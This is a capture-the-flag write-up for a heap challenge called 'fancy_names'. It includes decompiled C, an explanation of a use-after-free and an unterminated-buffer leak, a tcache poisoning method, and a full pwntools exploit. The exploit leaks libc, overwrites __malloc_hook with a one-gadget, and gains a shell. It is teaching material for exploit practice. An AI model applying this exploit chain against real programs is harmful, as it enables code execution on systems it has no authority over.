```c


void menu(char *param_1)

{
 int cmp;
 char *heap_data;
 char *user_input;
 size_t num_bytes;
 size_t length;
 char *output_data;
 time_t tVar1;
 long menu_choice;
 int *something;
 int *sumthing;
 undefined8 *soomthing;
 long in_FS_OFFSET;
 ulong times_changed;
 long username_changes;
 char yes_or_no [3];
 undefined8 buf3 [14];
 undefined8 buf1 [14];
 undefined8 buf2 [14];
 char buf [264];
 long cookie;
 bool bool_val;
 
 cookie = *(long *)(in_FS_OFFSET + 0x28);
 times_changed = 0;
 username_changes = 0;
 bool_val = false;
 something = (int *)buf3;
 for (menu_choice = 12; menu_choice != 0; menu_choice = menu_choice + -1) {
  *(undefined8 *)something = 0;
  something = something + 2;
 }
 *something = 0;
 sumthing = (int *)buf1;
 for (menu_choice = 12; menu_choice != 0; menu_choice = menu_choice + -1) {
  *(undefined8 *)sumthing = 0;
  sumthing = sumthing + 2;
 }
 *sumthing = 0;
 soomthing = buf2;
 for (menu_choice = 12; menu_choice != 0; menu_choice = menu_choice + -1) {
  *soomthing = 0;
  soomthing = soomthing + 1;
 }
 *(undefined4 *)soomthing = 0;
 heap_data = (char *)malloc(100);
 strcpy(heap_data,param_1);
 user_input = (char *)malloc(100);
 strcpy(user_input,param_1);
 do {
  while( true ) {
    while( true ) {
     while( true ) {
       if (1 < times_changed) {
        fprintf(stdout,"\n%s[+] Welcome %s!\n%s","\x1b[1;32m",user_input,"\x1b[1;34m");
        fflush(stdout);
        if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {
              /* WARNING: Subroutine does not return */
         __stack_chk_fail();
        }
        return;
       }
       fflush(stdout);
       fwrite("\n[!] You can only change name twice! One custom and one suggested. Choose wisely! \n\n"
           ,1,0x53,stdout);
       fwrite("*********************\n",1,0x16,stdout);
       fwrite("*                   *\n",1,0x16,stdout);
       fwrite("*  [1] Custom name  *\n",1,0x16,stdout);
       fwrite("*  [2] Reroll name  *\n",1,0x16,stdout);
       fwrite("*  [3] Continue     *\n",1,0x16,stdout);
       fwrite("*  [4] Exit         *\n",1,0x16,stdout);
       fwrite("*                   *\n",1,0x16,stdout);
       fwrite("*********************\n\n> ",1,0x19,stdout);
       fflush(stdout);
       menu_choice = read_num();
       if (menu_choice == 2) break;
       if (menu_choice == 3) {
        times_changed = 10;
       }
       else {
        if (menu_choice != 1) {
         fwrite("\n[+] Goodbye!\n\n",1,0xf,stdout);
              /* WARNING: Subroutine does not return */
         exit(0);
        }
        if (username_changes == 2) {
         fprintf(stdout,"%s\n[-] Cannot change username again!\n%s","\x1b[1;31m","\x1b[1;34m");
        }
        else {
         if (username_changes == 0) {
           free(heap_data);
           fflush(stdout);
           fprintf(stdout,"%s\n[+] Old name has been deleted!%s\n","\x1b[1;32m","\x1b[1;34m");
           fflush(stdout);
           username_changes = 1;
         }
         fflush(stdout);
         fwrite("\n[*] Insert new name (minimum 5 chars): ",1,0x28,stdout);
         fflush(stdout);
         num_bytes = read(0,buf,99);
         fflush(stdout);
         fprintf(stdout,"\n[*] Are you sure you want to use the name %s\n(y/n): ",buf);
         fflush(stdout);
         read(0,yes_or_no,2);
         if (yes_or_no[0] == 'y') {
           if ((int)num_bytes < 6) {
            fprintf(stdout,"%s\n[-] Invalid name!\n%s","\x1b[1;31m","\x1b[1;34m");
            memset(buf,0,(long)(int)num_bytes);
           }
           else {
            username_changes = 2;
            times_changed = times_changed + 1;
            strcpy(user_input,buf);
            length = strlen(user_input);
            user_input[length - 1] = '\0';
            cmp = strcmp(user_input,"wisely");
            if (cmp == 0) {
              output_data = "\n%s[-.-] Very funny.. 10 points to Gryffindor!%s\n\n";
            }
            else {
              output_data = "\n";
            }
            fprintf(stdout,output_data,"\x1b[1;31m","\x1b[1;34m");
            fprintf(stdout,"\n[!] New name: %s%s%s\n","\x1b[1;32m",user_input,"\x1b[1;34m");
            memset(buf,0,256);
           }
         }
         else {
           memset(buf,0,256);
           fprintf(stdout,"%s\n[*] Name has not been changed!\n%s","\x1b[1;35","\x1b[1;34m");
         }
        }
       }
     }
     if (!bool_val) break;
     fprintf(stdout,"%s\n[-] Cannot change username again!\n%s","\x1b[1;31m","\x1b[1;34m");
    }
    free(user_input);
    fprintf(stdout,"\n%s[!] Name has been deleted!\n[*] Generating suggested names..%s\n",
         "\x1b[1;32m","\x1b[1;34m");
    create_random_username(buf3);
    sleep(1);
    tVar1 = time((time_t *)0x0);
    srand((uint)tVar1);
    create_random_username(buf1);
    sleep(1);
    tVar1 = time((time_t *)0x0);
    srand((uint)tVar1);
    create_random_username(buf2);
    fflush(stdout);
    fprintf(stdout,"\n[*] Choose from suggested names:\n\n1. %s\n2. %s\n3. %s\n\n> ",buf3,buf1,
         buf2);
    fflush(stdout);
    menu_choice = read_num();
    if (menu_choice != 2) break;
    strcpy(user_input,(char *)buf1);
LAB_00102077:
    times_changed = times_changed + 1;
    bool_val = true;
  }
  if (menu_choice == 3) {
    strcpy(user_input,(char *)buf2);
    goto LAB_00102077;
  }
  if (menu_choice == 1) {
    strcpy(user_input,(char *)buf3);
    goto LAB_00102077;
  }
  fprintf(stdout,"%s\n[-] Invalid option!\n%s","\x1b[1;31m","\x1b[1;34m");
  bool_val = true;
 } while( true );
}
```

### use after free
- since this function is almost basically all within a do while, it will not go onto the main function until we enter `y` when using the custom name functionality.
```c
         if (yes_or_no[0] == 'y') {
           if ((int)num_bytes < 6) {
            fprintf(stdout,"%s\n[-] Invalid name!\n%s","\x1b[1;31m","\x1b[1;34m");
            memset(buf,0,(long)(int)num_bytes);
           }
           else {
            username_changes = 2;
            times_changed = times_changed + 1;
            strcpy(user_input,buf);
            length = strlen(user_input);
            user_input[length - 1] = '\0';
            cmp = strcmp(user_input,"wisely");
            if (cmp == 0) {
              output_data = "\n%s[-.-] Very funny.. 10 points to Gryffindor!%s\n\n";
            }
            else {
              output_data = "\n";
            }
            fprintf(stdout,output_data,"\x1b[1;31m","\x1b[1;34m");
            fprintf(stdout,"\n[!] New name: %s%s%s\n","\x1b[1;32m",user_input,"\x1b[1;34m");
            memset(buf,0,256);
           }
         }
```
- we can write to the chunk using this functionality.
- keep in mind though, `strcpy` copies data until a null-byte so when writing something like an address that has null-bytes we need to reconstruct it so that it will pass, thankfully it tries to replace the newline with a null-byte however the 'developer' is writing just before the newline `user_input[length - 1] = '\0';`, this gives us the opproutunity to bypass the 'restriction'.


```c
    free(user_input);
    fprintf(stdout,"\n%s[!] Name has been deleted!\n[*] Generating suggested names..%s\n",
         "\x1b[1;32m","\x1b[1;34m");
```
- this will free the chunk we can write to.

```c
         if (username_changes == 0) {
           free(heap_data);
           fflush(stdout);
           fprintf(stdout,"%s\n[+] Old name has been deleted!%s\n","\x1b[1;32m","\x1b[1;34m");
           fflush(stdout);
           username_changes = 1;
         }
```
- this will free the original allocated chunk.
### improper null termination
```c
         fwrite("\n[*] Insert new name (minimum 5 chars): ",1,0x28,stdout);
         fflush(stdout);
         num_bytes = read(0,buf,99);
         fflush(stdout);
         fprintf(stdout,"\n[*] Are you sure you want to use the name %s\n(y/n): ",buf);
```
- in this snippet from menu function, we can see that it is using read to read from stdin placing the data into a 264 char buffer and the read size is 99, due to the improper null termination, when the buffer is printed back to us there can be leaks.

---

- examining our leak we see that we need to be writing a byte less then we currently are because our newline is corrupting the leak
![](https://i.imgur.com/dfjKOGP.png)
- this is our data after sending 16 bytes but remember we're also writing a newline so be careful about sending data with new lines when you're trying to leak things.

---

### use after free -> tcache poison methodology:
 - 1. UAF write to the tcache FD point it to any useful address, think about potential got overwrites or writing into function pointers 
 - 2. Allocate memory of the same size as the corrupted chunk, which will remove the chunk from the tcache. 
 - 3. Allocate memory again, this will be writing the data to specified location (i.e, write what where primitive) 

```python
from pwn import *  
  
  
elf = context.binary = ELF("fancy_names_patched", checksec=True)  
libc = elf.libc  
context.arch = "amd64"  
context.log_level = "debug"  
  
gs = """  
continue"""  
  
def start():  
 with context.quiet:  
   if args.GDB:  
     return gdb.debug(elf.path, gdbscript=gs, api=True)  
   elif args.REMOTE:  
     return remote(host, port)  
   else:  
     return process(elf.path)  
  
def pause():  
 if args.GDB:  
   io.gdb.interrupt_and_wait()  
  
io = start()  
#io = remote()  
#io.timeout = 1  
  
def leak_val(size: int) -> int:  
   io.sendlineafter(b"> ", b"1")  
   payload_one = b"B" * size  
   io.sendlineafter(b": " ,payload_one)  
   io.recvuntil(payload_one)  
   io.recvline()  
   leak = int.from_bytes(io.recvline().rstrip(), byteorder="little")  
   io.sendlineafter(b": ", b"n")  
   return leak  
  
fprintf_leak = leak_val(55)  
log.info(f"fprintf leak @ {fprintf_leak:#x}")  
  
libc.address = fprintf_leak - (libc.sym.fprintf+148)  
log.info(f"libc @ {libc.address:#x}")  
  
  
def uaf(data):  
   io.sendlineafter(b"> ", b"2")  
   io.sendlineafter(b"> ", b"2")  
   io.sendlineafter(b"> ", b"1")  
   io.sendafter(b": ", data)
   io.sendlineafter(b": ", b"y")  
  
  
def reconstruct(byte_str, index: int, r_byte: int) -> bytes:  
   bytes_list = [p8(byte) for byte in byte_str]  
   bytes_list[index] = p8(r_byte)  
   return b"".join(bytes_list)
   #payload = payload[:-2] + b"A" 

  
payload = reconstruct(p64(libc.sym.__malloc_hook), 6, 0x42)  
uaf(payload)

io.sendlineafter(b"> ", b"1")  
io.sendlineafter(b": ", b"94")  
io.sendlineafter(b": ", b"pwnpope")  

io.sendlineafter(b"> ", b"1")  
io.sendlineafter(b": ", b"94")  
io.sendlineafter(b": ", p64(libc.address+0x4f432))  

io.interactive()
```

[video lecture](https://capture.udel.edu/media/tcache+poisoning+(Write+What+Where+via+UAF)/1_sjkqd9ay/290632652) - write what where via UAF
